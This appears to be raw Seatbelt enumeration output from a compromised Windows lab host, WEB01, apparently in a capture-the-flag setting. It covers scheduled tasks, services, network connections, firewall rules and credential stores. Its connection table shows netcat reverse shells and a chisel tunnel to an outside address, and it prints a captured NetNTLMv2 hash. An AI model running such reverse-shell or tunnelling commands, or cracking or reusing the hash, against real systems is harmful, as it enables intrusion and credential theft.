  Name                              :   SecureBootEncodeUEFI
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT10S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %WINDIR%\system32\SecureBootEncodeUEFI.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskRegistrationTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      EndBoundary                   :   2025-12-31T12:00:00
      StopAtDurationEnd             :   False
      Delay                         :   PT5M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StartBoundary                 :   2025-12-31T12:00:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StartComponentCleanup
  Principal                         :
      GroupId                       :
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {752073A1-23F2-4396-85F0-8FDB879ED0ED}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   BackgroundUploadTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {59B9640B-3F70-4D1C-B159-F26EEB8A4C87}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   BackupTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {60A4C78C-E2B8-4E6E-876F-DA203B02C05E}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   NetworkStateChangeTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {A4173A49-F373-4475-9A0F-2D615204DC20}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Account Cleanup
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT30M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
      Execute                       :   %windir%\System32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Collection
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT10M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd publish
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2000-01-01T03:00:00
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT30M
      ------------------------------

  Name                              :   Configuration
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd configure
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------

  Name                              :   SpaceManagerTask
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\spaceman.exe,-2)
  Description                       :   $(@%SystemRoot%\system32\spaceman.exe,-3)
  Source                            :   $(@%SystemRoot%\system32\spaceman.exe,-1)
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /Work
      Execute                       :   %windir%\system32\spaceman.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   HeadsetButtonPress
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FA;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   StartedFromTask
      Execute                       :   %windir%\system32\speech_onecore\common\SpeechRuntime.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MsCtfMonitor
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :   TextServicesFramework monitor task
  Source                            :   Microsoft Corporation
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Automatic-Device-Join
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :   Register this computer if the computer is already joined to an Active Directory domain.
  Source                            :
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   $(Arg0) $(Arg1) $(Arg2)
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskEventTrigger
      Enabled                       :   True
      Duration                      :   P1D
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      Subscription                  :   <QueryList><Query Id="0" Path="Microsoft-Windows-User Device Registration/Admin"><Select Path="Microsoft-Windows-User Device Registration/Admin">*[System[Provider[@Name='Microsoft-Windows-User Device Registration'] and EventID=4096]]</Select></Query></QueryList>
      ------------------------------

  Name                              :   Recovery-Check
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :
  Author                            :
  Description                       :   Performs recovery check.
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /checkrecovery
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

====== SearchIndex ======

====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : svc_dev::WEB01:1122334455667788:29ce1018917015298de34f95dc3a0e7b:01010000000000008e70520fb9bbdc01deada6f71c5810c2000000000800300030000000000000000000000000200000f08dbc512d4fe634ffec049e0e597d76df62a17680beb2bd5baa26f56c8e994a0a00100000000000000000000000000000000000090000000000000000000000

====== SecurityPackages ======

Security Packages


  Name                           : Negotiate
  Comment                        : Microsoft Package Negotiator
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
  MaxToken                       : 48256
  RPCID                          : 9
  Version                        : 1

  Name                           : NegoExtender
  Comment                        : NegoExtender Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 30
  Version                        : 1

  Name                           : Kerberos
  Comment                        : Microsoft Kerberos V1.0
  Capabilities                   : 42941375
  MaxToken                       : 48000
  RPCID                          : 16
  Version                        : 1

  Name                           : NTLM
  Comment                        : NTLM Security Package
  Capabilities                   : 42478391
  MaxToken                       : 2888
  RPCID                          : 10
  Version                        : 1

  Name                           : TSSSP
  Comment                        : TS Service Security Package
  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
  MaxToken                       : 13000
  RPCID                          : 22
  Version                        : 1

  Name                           : pku2u
  Comment                        : PKU2U Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 31
  Version                        : 1

  Name                           : CloudAP
  Comment                        : Cloud AP Security Package
  Capabilities                   : LOGON, NEGOTIABLE2, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 0
  RPCID                          : 36
  Version                        : 1

  Name                           : WDigest
  Comment                        : Digest Authentication for Windows
  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
  MaxToken                       : 4096
  RPCID                          : 21
  Version                        : 1

  Name                           : Schannel
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Microsoft Unified Security Protocol Provider
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Default TLS SSP
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  Type                           : Own Process
  ServiceCommand                 : C:\WINDOWS\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\WINDOWS\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     :
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    :
  FileDescription                :
  Version                        : 7.7.2.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  Type                           : Own Process
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     :
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Guest Authentication Service
  Version                        : 12.4.0.4307
  IsDotNet                       : False

  Name                           : vm3dservice
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  Type                           : Own Process
  ServiceCommand                 : C:\WINDOWS\system32\vm3dservice.exe
  BinaryPath                     : C:\WINDOWS\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     :
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 9.17.07.0002
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  Type                           : Own Process
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     :
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 12.4.0.48309
  IsDotNet                       : False

====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== SysmonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:135            0.0.0.0:0              LISTEN     1008  RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:1433           0.0.0.0:0              LISTEN     4328  MSSQLSERVER     sqlservr.exe
  0.0.0.0:3389           0.0.0.0:0              LISTEN     796   TermService     svchost.exe
  0.0.0.0:5357           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     576                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     1320  EventLog        svchost.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1832  Schedule        svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     736   Netlogon        lsass.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     3316  SessionEnv      svchost.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     736                   lsass.exe
  0.0.0.0:49713          0.0.0.0:0              LISTEN     716                   services.exe
  10.13.38.20:139        0.0.0.0:0              LISTEN     4                     System
  10.13.38.20:50999      10.10.16.32:4444       ESTAB      3564                  C:\Users\svc_dev\nc.exe  10.10.16.32 4444 -e cmd
  10.13.38.20:51388      10.10.16.32:9999       ESTAB      480                   chisel.exe  client 10.10.16.32:9999 R:socks
  10.13.38.20:51522      10.10.16.32:4444       ESTAB      2964                  C:\Users\svc_dev\nc.exe  10.10.16.32 4444 -e cmd
  10.13.38.20:51527      10.10.16.32:443        ESTAB      3052
  10.13.38.20:53526      10.10.16.32:6666       ESTAB      1732                  C:\Users\svc_dev\nc.exe  10.10.16.32 6666 -e cmd
  127.0.0.1:135          127.0.0.1:51562        ESTAB      1008  RpcSs           svchost.exe
  127.0.0.1:1434         0.0.0.0:0              LISTEN     4328  MSSQLSERVER     sqlservr.exe
  127.0.0.1:51562        127.0.0.1:135          ESTAB      1768                  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"
  192.168.10.39:139      0.0.0.0:0              LISTEN     4                     System
  192.168.10.39:51557    192.168.10.6:135       ESTAB      736                   lsass.exe
  192.168.10.39:51558    192.168.10.6:49666     ESTAB      736                   lsass.exe
  192.168.10.39:51559    192.168.10.6:513       SYN_SENT   5008                  powershell
  192.168.10.39:51560    192.168.10.6:49666     ESTAB      736                   lsass.exe
  192.168.10.39:51561    192.168.10.6:515       SYN_SENT   5288                  powershell
====== TokenGroups ======

Current Token's Groups

  WEB01\None                               S-1-5-21-197600473-3515118913-3158175032-513
  Everyone                                 S-1-1-0
  BUILTIN\Users                            S-1-5-32-545
  BUILTIN\Performance Log Users            S-1-5-32-559
  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  CONSOLE LOGON                            S-1-2-1
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  NT AUTHORITY\Local account               S-1-5-113
  LOCAL                                    S-1-2-0
  NT AUTHORITY\NTLM Authentication         S-1-5-64-10
====== TokenPrivileges ======

Current Token's Privileges

                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 1
  LocalAccountTokenFilterPolicy  :
  FilterAdministratorToken       : 0
    [*] Default Windows settings - Only the RID-500 local admin account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            1136   W32Time                 svchost.exe
  0.0.0.0:500            2668   IKEEXT                  svchost.exe
  0.0.0.0:3389           796    TermService             svchost.exe
  0.0.0.0:3702           3636   FDResPub                svchost.exe
  0.0.0.0:3702           3636   FDResPub                svchost.exe
  0.0.0.0:4500           2668   IKEEXT                  svchost.exe
  0.0.0.0:5353           1360   Dnscache                svchost.exe
  0.0.0.0:5355           1360   Dnscache                svchost.exe
  0.0.0.0:54403          3636   FDResPub                svchost.exe
  10.13.38.20:137        4                              System
  10.13.38.20:138        4                              System
  10.13.38.20:1900       3300   SSDPSRV                 svchost.exe
  10.13.38.20:51166      3300   SSDPSRV                 svchost.exe
  127.0.0.1:1900         3300   SSDPSRV                 svchost.exe
  127.0.0.1:51167        3300   SSDPSRV                 svchost.exe
  127.0.0.1:56340        1500   gpsvc                   svchost.exe
  127.0.0.1:57028        2244   iphlpsvc                svchost.exe
  127.0.0.1:57103        1472   NlaSvc                  svchost.exe
  127.0.0.1:61709        736    Netlogon                lsass.exe
  127.0.0.1:61710        2164   LanmanWorkstation       svchost.exe
  192.168.10.39:137      4                              System
  192.168.10.39:138      4                              System
  192.168.10.39:1900     3300   SSDPSRV                 svchost.exe
  192.168.10.39:51165    3300   SSDPSRV                 svchost.exe
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at AnschnallGurt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at AnschnallGurt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : WEB01
  DefaultUserName                : svc_dev
  DefaultPassword                :
  AltDefaultDomainName           :
  AltDefaultUserName             :
  AltDefaultPassword             :

====== WindowsCredentialFiles ======

  Folder : C:\Users\svc_dev\AppData\Local\Microsoft\Credentials\

    FileName     : 6C0FA35116FC27371A650B528FAEE6C0
    Description  : Local Credential Data

    MasterKey    : 67f368d2-3d19-4912-89fc-643c7288b37d
    Accessed     : 9/27/2024 7:05:04 AM
    Modified     : 9/27/2024 7:05:04 AM
    Size         : 560

    FileName     : 83FEBF0027B9D0D06E0C8820B4C65F4D
    Description  : Local Credential Data

    MasterKey    : 67f368d2-3d19-4912-89fc-643c7288b37d
    Accessed     : 9/27/2024 7:04:28 AM
    Modified     : 9/27/2024 7:04:28 AM
    Size         : 512


====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block Ports
  Description          :
  ApplicationName      :
  Protocol             : TCP
  Action               : Block
  Direction            : In
  Profiles             :
  Local Addr:Port      : :445
  Remote Addr:Port     : 10.14.14.0/255.255.254.0:

====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 0
====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,186,0,3,2,2
  BootupState                   : Normal boot
  Caption                       : WEB01
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -420
  DaylightInEffect              : True
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : WEB01
  Domain                        : daedalus.local
  DomainRole                    : 3
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : WEB01
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 8
  NumberOfProcessors            : 4
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : True
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      SQLServer
      NT
      Server_NT
      Potential_Browser
